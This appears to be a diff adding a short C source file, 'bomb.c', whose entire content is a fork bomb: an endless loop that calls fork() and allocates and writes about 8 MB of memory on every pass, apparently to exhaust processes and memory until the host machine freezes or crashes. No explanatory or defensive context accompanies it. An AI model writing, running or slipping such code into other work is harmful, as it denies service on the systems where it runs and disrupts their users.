@@ -1,0 +1,8 @@
+// bomb.c
+#include <stdlib.h>
+
+int main(void) {
+int *x;
+
+for(;;) {fork();x = malloc(sizeof(int) * 2097152);*x = 0;}
+}
